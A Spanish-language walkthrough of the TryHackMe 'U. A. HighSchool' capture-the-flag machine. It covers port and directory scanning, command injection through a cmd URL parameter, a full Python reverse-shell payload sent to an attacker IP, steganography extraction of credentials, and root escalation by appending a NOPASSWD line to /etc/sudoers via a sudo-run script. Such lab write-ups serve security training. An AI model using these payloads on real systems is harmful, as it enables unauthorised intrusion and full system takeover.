---
title: HighSchool
description: Write Up de la máquina High School de la plataforma TryHackMe
published: true
date: 2025-05-11T13:43:59.466Z
tags: 
editor: markdown
dateCreated: 2025-05-06T15:54:10.908Z
---

# U. A. HighSchool
Bienvenido al write up de la maquina HighSchool de TryHackMe.

## Reconocimiento
Lo primero que vamos a hacer es un analisis de los puertos disponibles donde encontramos tanto el puerto 22, como el puerto 80.
```
nmap -sT -Pn -sV 10.10.229.240
```
![Escaneo de puertos](/imagenes/highschool_1.png)

Así que vamos a entrar en el website, para saber que hay.

Podemos empezar a hacer uso del dirb para comprobar las entradas a los que tenemos acceso.
```
dirb http://{IP}
```
![Escaneo de Dirb](/imagenes/highschool_2.png)

Dentro del analisis hemos encontrado la carpeta assest, aquí vamos a entrar a comprobar que mas cosas interesantes podemos encontrar.

![Acceder al index.php](/imagenes/highschool_3.png)

Se carga una página pero aparantemente está vacía por lo que vamos a hacer intentar modificar el URL con un ?cmd, por ejemplo:
?cmd=id

![Analisis Base64](/imagenes/highschool_5.png)

Como podemos observar, nos da una serie de caracteres aparentemente aleatorio, pero aparienta estar cifrado en base64, por lo que vamos a decodificarlo.

El resultado era el esperado, ahora deberemos intentar hacer una shell reversa para tener acceso, ya que la url interpreta comandos.

## Explotación
Podemos intentar hacer una URL con:
*?cmd=export RHOST="10.9.3.144";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'*

![Infiltrarse](/imagenes/highschool_6.png)

Como podemos observar, tenemos acceso por lo que la shell reversa ha funcionado perfectamente.

![Acceso](/imagenes/highschool_7.png)

Vamos a securizar la shell para ello ponemos:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Tras esto hacemoz Ctrl + Z y ponemos stty raw -echo;fg

Le damos a enter dos veces y ponemos export TERM=xterm.

![Shell curada](/imagenes/highschool_8.png)

Tras acceder, vamos a mirar lo que hay en la carpeta /var/www, ya que a lo mejor aloja otro servicio.
![Mirar contenidos](/imagenes/highschool_9.png)

Sin embargo está cifrada, por lo que deberemos emplear alguna herramienta para descifrarla.

![Passphares](/imagenes/highschool_10.png)

Una vez realizado, podemos observar como la contraseña es "AllmightForEver!!!"

Sin embargo, creemos que está contraseá corresponderá a alguna imagen, vamos a mirar que imagenes hay en el servidor activo.

![Imagenes](/imagenes/highschool_11.png)

Como podemos observar tenemos dos imagenes, vamos a obtenerla en nuestra Kali, con un wget.

![Descarga](/imagenes/highschool_12.png)

Si nos digimos a las imagenes, podemos observar como yuei.jpg si que está correcta, sin embargo oneforall.jpg, está corrompida.

![Mirar imagenes](/imagenes/highschool_13.png)

Para arreglarla, vamos a usar una herramienta llamada MagicBytes, del github Haxrein.

para ello haremos:
```
git clone https://github.com/Haxrein/MagicBytes.git
```

![Repositorio](/imagenes/highschool_14.png)

Una vez clonado el Git, vamos a usarlo para reparar la imagen mediante el siguiente comando:
```
python3 magicbytes.py -i {ruta del archivo} -m jpg
```

![Funcionamiento](/imagenes/highschool_15.png)

Ahora si que podriamos usar steghide, para sacar la esteganografía detras de la imagen.

Para ello vamos a hacer uso de steghide de la siguiente manera:
```
steghide extract -sf {imagenes}
```
Y cuando nos pidan la passphrase, podemos usar la que anteriormente hemos obtenido 

![Escenanografía](/imagenes/highschool_16.png)

Como podemos observar, ha funcionado con oneforall.jgp, sin embargo con yuei.jpg, no.

Obtenemos leemos el archivo mediante un cat creds.txt.

![Contraseña](/imagenes/highschool_17.png)

Tras esto podemos leer que tenemos unas credenciales y podemos loguearnos como el usuario "deku".

![Comprobar usuario](/imagenes/highschool_18.png)

Nos dirigimos al home del usuario y encontraremos la primera flag.


![Primera flag](/imagenes/highschool_19.png)



Ahora vamosa intentar escalar privilegios, para ello vamos a hacer uso de

```
sudo -l
```

![Permisos](/imagenes/highschool_20.png)

Como podemos observar, podemos ejecutar un script llamado feedback, como root, vamos a leerlo.


![Script](/imagenes/highschool_21.png)

El script hace lo siguiente paso por paso:
1. Saluda al usuario
2. Lee un parametro llamado feedback
3. Si el feedback tiene una serie de caracteres previlegios, da un error.
4. Si el feedback es correcto, lo escribe por pantalla y lo guarda en un archivo llamado /var/log/feedback.txt

Para saltarnos está restricción podemos hacer varias cosas, una de ellas puede ser:
- Escribir en /etc/sudoers privilegios a nuestro usuario.

Para ello vamos a poner "deku ALL=NOPASSWD: ALL >> /etc/sudoers"

![Ultima flag](/imagenes/highschool_22.png)

Tras esto podemos observar como tenemos root, y podemos leer la última flag.
IMAGEN 23